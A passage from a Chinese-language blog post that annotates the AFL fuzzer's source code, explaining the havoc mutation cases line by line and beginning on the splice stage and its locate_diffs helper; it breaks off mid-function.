stage_max;</span><br></pre></td></tr></table></figure><p>到上面这些确定性变异都已经完成了。接下来是非确定性变异，会随机处理某字节，可能采用之前出现的几种可能，这里就不详细赘述了。</p><h3 id="非确定性变异"><a href="#非确定性变异" class="headerlink" title="非确定性变异"></a>非确定性变异</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">havoc_stage:</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = <span class="number">-1</span>; <span class="comment">// 当前处理的字节位置，-1表示不针对特定字节</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * havoc变异代码也在拼接（splice）文件时调用</span></span><br><span class="line"><span class="comment">   * 如果设置了splice_cycle，生成不同的阶段描述信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!splice_cycle) &#123;</span><br><span class="line">    <span class="comment">// 普通havoc阶段</span></span><br><span class="line">    stage_name = <span class="string">&quot;havoc&quot;</span>;</span><br><span class="line">    stage_short = <span class="string">&quot;havoc&quot;</span>;</span><br><span class="line">    <span class="comment">// 计算最大迭代次数：基于性能评分、确定性模式、havoc除数</span></span><br><span class="line">    stage_max = (doing_det ? HAVOC_CYCLES_INIT : HAVOC_CYCLES) * perf_score /</span><br><span class="line">                havoc_div / <span class="number">100</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// splice阶段（文件拼接后的havoc）</span></span><br><span class="line">    <span class="keyword">static</span> u8 tmp[<span class="number">32</span>];</span><br><span class="line">    perf_score = orig_perf; <span class="comment">// 使用原始性能评分</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;splice %u&quot;</span>, splice_cycle); <span class="comment">// 生成阶段名称</span></span><br><span class="line">    stage_name = tmp;</span><br><span class="line">    stage_short = <span class="string">&quot;splice&quot;</span>;</span><br><span class="line">    <span class="comment">// splice阶段的迭代次数更少</span></span><br><span class="line">    stage_max = SPLICE_HAVOC * perf_score / havoc_div / <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 确保至少执行最小次数的havoc变异</span></span><br><span class="line">  <span class="keyword">if</span> (stage_max &lt; HAVOC_MIN)</span><br><span class="line">    stage_max = HAVOC_MIN;</span><br><span class="line"></span><br><span class="line">  temp_len = len; <span class="comment">// 临时长度，因为变异可能改变文件大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录开始时的路径数和崩溃数，用于后续比较</span></span><br><span class="line">  orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  havoc_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 主循环：执行数千次运行（具体次数取决于perf_score）</span></span><br><span class="line"><span class="comment">   * 每次迭代对输入文件进行随机堆叠的多种变异操作</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 决定这轮要堆叠多少个变异操作</span></span><br><span class="line"><span class="comment">     * 使用2的幂次方：2, 4, 8, 16...</span></span><br><span class="line"><span class="comment">     * UR(HAVOC_STACK_POW2)随机选择幂次</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    u32 use_stacking = <span class="number">1</span> &lt;&lt; (<span class="number">1</span> + UR(HAVOC_STACK_POW2));</span><br><span class="line">    stage_cur_val = use_stacking;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行堆叠的多个变异操作</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; use_stacking; i++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * 随机选择一种变异操作（0-16）</span></span><br><span class="line"><span class="comment">       * 如果有字典条目，范围是0-16，否则是0-14</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">switch</span> (UR(<span class="number">15</span> + ((extras_cnt + a_extras_cnt) ? <span class="number">2</span> : <span class="number">0</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异0：位翻转（Bit flip）</span></span><br><span class="line"><span class="comment">         * 随机选择一个位进行翻转（0-&gt;1 或 1-&gt;0）</span></span><br><span class="line"><span class="comment">         * temp_len &lt;&lt; 3 将字节数转换为位数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FLIP_BIT(out_buf, UR(temp_len &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异1：设置字节为有趣值</span></span><br><span class="line"><span class="comment">         * interesting_8是预定义的&quot;有趣&quot;字节数组（如0, 1, -1, 127, -128等）</span></span><br><span class="line"><span class="comment">         * 这些值在实际程序中容易触发边界条件</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        out_buf[UR(temp_len)] = interesting_8[UR(<span class="keyword">sizeof</span>(interesting_8))];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异2：设置16位字（word）为有趣值</span></span><br><span class="line"><span class="comment">         * 随机选择字节序（大端或小端）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>) <span class="comment">// 文件太小则跳过</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          <span class="comment">// 50%概率：使用本地字节序</span></span><br><span class="line">          *(u16 *)(out_buf + UR(temp_len - <span class="number">1</span>)) =</span><br><span class="line">              interesting_16[UR(<span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 50%概率：使用交换后的字节序</span></span><br><span class="line">          *(u16 *)(out_buf + UR(temp_len - <span class="number">1</span>)) =</span><br><span class="line">              SWAP16(interesting_16[UR(<span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异3：设置32位双字（dword）为有趣值</span></span><br><span class="line"><span class="comment">         * 同样随机选择字节序</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          *(u32 *)(out_buf + UR(temp_len - <span class="number">3</span>)) =</span><br><span class="line">              interesting_32[UR(<span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          *(u32 *)(out_buf + UR(temp_len - <span class="number">3</span>)) =</span><br><span class="line">              SWAP32(interesting_32[UR(<span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异4：字节减法</span></span><br><span class="line"><span class="comment">         * 随机选择一个字节，减去1到ARITH_MAX之间的随机值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        out_buf[UR(temp_len)] -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异5：字节加法</span></span><br><span class="line"><span class="comment">         * 随机选择一个字节，加上1到ARITH_MAX之间的随机值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        out_buf[UR(temp_len)] += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异6：16位字减法</span></span><br><span class="line"><span class="comment">         * 需要处理字节序问题</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          <span class="comment">// 本地字节序</span></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          *(u16 *)(out_buf + pos) -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 需要交换字节序：读取-&gt;交换-&gt;减法-&gt;交换-&gt;写回</span></span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          u16 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">          *(u16 *)(out_buf + pos) =</span><br><span class="line">              SWAP16(SWAP16(*(u16 *)(out_buf + pos)) - num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异7：16位字加法</span></span><br><span class="line"><span class="comment">         * 处理方式与case 6类似</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          *(u16 *)(out_buf + pos) += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">1</span>);</span><br><span class="line">          u16 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">          *(u16 *)(out_buf + pos) =</span><br><span class="line">              SWAP16(SWAP16(*(u16 *)(out_buf + pos)) + num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异8：32位双字减法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          *(u32 *)(out_buf + pos) -= <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          u32 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">          *(u32 *)(out_buf + pos) =</span><br><span class="line">              SWAP32(SWAP32(*(u32 *)(out_buf + pos)) - num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异9：32位双字加法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">4</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">2</span>)) &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          *(u32 *)(out_buf + pos) += <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          u32 pos = UR(temp_len - <span class="number">3</span>);</span><br><span class="line">          u32 num = <span class="number">1</span> + UR(ARITH_MAX);</span><br><span class="line">          *(u32 *)(out_buf + pos) =</span><br><span class="line">              SWAP32(SWAP32(*(u32 *)(out_buf + pos)) + num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异10：随机字节XOR</span></span><br><span class="line"><span class="comment">         * 将随机字节与1-255的随机值进行异或</span></span><br><span class="line"><span class="comment">         * 使用1-255而不是0-255是为了避免XOR 0的无效操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        out_buf[UR(temp_len)] ^= <span class="number">1</span> + UR(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span> ... <span class="number">12</span>: &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异11-12：字节块删除</span></span><br><span class="line"><span class="comment">         * 使用两个case增加删除操作的概率（是插入的2倍）</span></span><br><span class="line"><span class="comment">         * 这样可以防止文件无限增长</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        u32 del_from, del_len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 选择要删除的块长度（不要删除太多）</span></span><br><span class="line">        del_len = choose_block_len(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 选择删除起始位置</span></span><br><span class="line">        del_from = UR(temp_len - del_len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用memmove移动后面的数据覆盖被删除的部分</span></span><br><span class="line">        memmove(out_buf + del_from, out_buf + del_from + del_len,</span><br><span class="line">                temp_len - del_from - del_len);</span><br><span class="line"></span><br><span class="line">        temp_len -= del_len; <span class="comment">// 更新文件长度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异13：字节块插入/克隆</span></span><br><span class="line"><span class="comment">         * 75%概率克隆现有字节块，25%概率插入常量字节块</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (temp_len + HAVOC_BLK_XL &lt; MAX_FILE) &#123;</span><br><span class="line"></span><br><span class="line">          u8 actually_clone = UR(<span class="number">4</span>); <span class="comment">// 0-3，其中1-3表示克隆</span></span><br><span class="line">          u32 clone_from, clone_to, clone_len;</span><br><span class="line">          u8 *new_buf;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (actually_clone) &#123;</span><br><span class="line">            <span class="comment">// 克隆模式：从现有内容中选择一个块</span></span><br><span class="line">            clone_len = choose_block_len(temp_len);</span><br><span class="line">            clone_from = UR(temp_len - clone_len + <span class="number">1</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 常量模式：生成固定长度的常量块</span></span><br><span class="line">            clone_len = choose_block_len(HAVOC_BLK_XL);</span><br><span class="line">            clone_from = <span class="number">0</span>; <span class="comment">// 不使用</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          clone_to = UR(temp_len); <span class="comment">// 插入位置</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// 分配新缓冲区</span></span><br><span class="line">          new_buf = ck_alloc_nozero(temp_len + clone_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 复制插入点之前的数据</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf, out_buf, clone_to);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 插入克隆或常量数据</span></span><br><span class="line">          <span class="keyword">if</span> (actually_clone)</span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf + clone_to, out_buf + clone_from, clone_len);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 50%填充随机值，50%填充文件中的随机字节</span></span><br><span class="line">            <span class="built_in">memset</span>(new_buf + clone_to, UR(<span class="number">2</span>) ? UR(<span class="number">256</span>) : out_buf[UR(temp_len)],</span><br><span class="line">                   clone_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 复制插入点之后的数据</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf + clone_to + clone_len, out_buf + clone_to,</span><br><span class="line">                 temp_len - clone_to);</span><br><span class="line"></span><br><span class="line">          ck_free(out_buf);</span><br><span class="line">          out_buf = new_buf;</span><br><span class="line">          temp_len += clone_len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">14</span>: &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异14：字节块覆写</span></span><br><span class="line"><span class="comment">         * 用随机选择的块（75%）或固定字节（25%）覆盖现有字节</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        u32 copy_from, copy_to, copy_len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp_len &lt; <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        copy_len = choose_block_len(temp_len - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        copy_from = UR(temp_len - copy_len + <span class="number">1</span>);</span><br><span class="line">        copy_to = UR(temp_len - copy_len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UR(<span class="number">4</span>)) &#123;</span><br><span class="line">          <span class="comment">// 75%概率：复制文件中的现有块</span></span><br><span class="line">          <span class="keyword">if</span> (copy_from != copy_to)</span><br><span class="line">            memmove(out_buf + copy_to, out_buf + copy_from, copy_len);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          <span class="comment">// 25%概率：用常量字节填充</span></span><br><span class="line">          <span class="built_in">memset</span>(out_buf + copy_to, UR(<span class="number">2</span>) ? UR(<span class="number">256</span>) : out_buf[UR(temp_len)],</span><br><span class="line">                 copy_len);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异15和16：字典操作</span></span><br><span class="line"><span class="comment">         * 只有在有字典条目（extras_cnt或a_extras_cnt）时才能被选择</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>: &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异15：用字典条目覆写字节</span></span><br><span class="line"><span class="comment">         * 在现有文件中随机位置覆写字典中的token</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="number">2</span>))) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 使用自动提取的字典（从测试用例中自动学习）</span></span><br><span class="line">          u32 use_extra = UR(a_extras_cnt);</span><br><span class="line">          u32 extra_len = a_extras[use_extra].len;</span><br><span class="line">          u32 insert_at;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (extra_len &gt; temp_len) <span class="comment">// 字典条目太大</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          insert_at = UR(temp_len - extra_len + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memcpy</span>(out_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 使用用户提供的字典</span></span><br><span class="line">          u32 use_extra = UR(extras_cnt);</span><br><span class="line">          u32 extra_len = extras[use_extra].len;</span><br><span class="line">          u32 insert_at;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (extra_len &gt; temp_len)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          insert_at = UR(temp_len - extra_len + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memcpy</span>(out_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>: &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 变异16：插入字典条目</span></span><br><span class="line"><span class="comment">         * 在文件中插入字典token，会增加文件大小</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        u32 use_extra, extra_len, insert_at = UR(temp_len + <span class="number">1</span>);</span><br><span class="line">        u8 *new_buf;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="number">2</span>))) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 使用自动字典</span></span><br><span class="line">          use_extra = UR(a_extras_cnt);</span><br><span class="line">          extra_len = a_extras[use_extra].len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE) <span class="comment">// 检查文件大小限制</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          new_buf = ck_alloc_nozero(temp_len + extra_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 复制插入点之前的数据</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf, out_buf, insert_at);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 插入字典条目</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 使用用户字典</span></span><br><span class="line">          use_extra = UR(extras_cnt);</span><br><span class="line">          extra_len = extras[use_extra].len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          new_buf = ck_alloc_nozero(temp_len + extra_len);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 复制插入点之前的数据</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf, out_buf, insert_at);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 插入字典条目</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 复制插入点之后的数据</span></span><br><span class="line">        <span class="built_in">memcpy</span>(new_buf + insert_at + extra_len, out_buf + insert_at,</span><br><span class="line">               temp_len - insert_at);</span><br><span class="line"></span><br><span class="line">        ck_free(out_buf);</span><br><span class="line">        out_buf = new_buf;</span><br><span class="line">        temp_len += extra_len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 执行变异后的测试用例</span></span><br><span class="line"><span class="comment">     * common_fuzz_stuff会运行目标程序并检测崩溃、超时等</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, temp_len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry; <span class="comment">// 如果出错则放弃当前测试用例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 恢复原始状态</span></span><br><span class="line"><span class="comment">     * out_buf可能已被变异操作修改（大小改变），需要恢复</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (temp_len &lt; len)</span><br><span class="line">      out_buf = ck_realloc(out_buf, len);</span><br><span class="line">    temp_len = len;</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf, in_buf, len); <span class="comment">// 从原始输入恢复</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 自适应策略：如果发现新路径，延长运行时间</span></span><br><span class="line"><span class="comment">     * 这是AFL的重要特性之一：对有潜力的输入加大测试力度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (queued_paths != havoc_queued) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果性能评分不太高，翻倍测试次数</span></span><br><span class="line">      <span class="keyword">if</span> (perf_score &lt;= HAVOC_MAX_MULT * <span class="number">100</span>) &#123;</span><br><span class="line">        stage_max *= <span class="number">2</span>;</span><br><span class="line">        perf_score *= <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      havoc_queued = queued_paths; <span class="comment">// 更新记录的队列大小</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算这个阶段发现的新路径和崩溃数</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 更新统计信息</span></span><br><span class="line"><span class="comment">   * 根据是否是splice阶段更新不同的统计计数器</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!splice_cycle) &#123;</span><br><span class="line">    stage_finds[STAGE_HAVOC] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">    stage_cycles[STAGE_HAVOC] += stage_max;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    stage_finds[STAGE_SPLICE] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">    stage_cycles[STAGE_SPLICE] += stage_max;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="拼接阶段"><a href="#拼接阶段" class="headerlink" title="拼接阶段"></a>拼接阶段</h3><p>这个部分是对当前样例进行拼接，随机选择一个不是自己的样例进行拼接，我这里大概举例说明：</p><p>假设我们当前测试用例为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">in_buf: [A B C D E F G H]  (长度=<span class="number">8</span>)</span><br><span class="line">位置:    <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p>目标用例为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_buf: [A B X Y Z F G H]  (长度=<span class="number">8</span>)</span><br><span class="line">位置:     <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p>这里的目标用例是随机选择出来的，然后通过队列链表找到该样例，这里有个小技巧：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">  target = target-&gt;next_100; <span class="comment">// 跳到100个条目后的位置</span></span><br><span class="line">  tid -= <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第二级：逐个遍历剩余的条目</span></span><br><span class="line"><span class="keyword">while</span> (tid--)</span><br><span class="line">  target = target-&gt;next;</span><br></pre></td></tr></table></figure><p>通过next_100可以加速寻找，找到后先验证，然后读取其内容，通过<strong>locate_diffs</strong>来进行差异化判定，这里我简单给出其注释：</p><h4 id="locate-diffs"><a href="#locate-diffs" class="headerlink" title="locate_diffs"></a>locate_diffs</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">locate_diffs</span><span class="params">(u8 *ptr1, u8 *ptr2, u32 len, s32 *first, s32 *last)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 f_loc = <span class="number">-1</span>;  <span class="comment">// 第一个差异位置，初始化为-1表示未找到</span></span><br><span class="line">  s32 l_loc = <span class="number">-1</span>;  <span 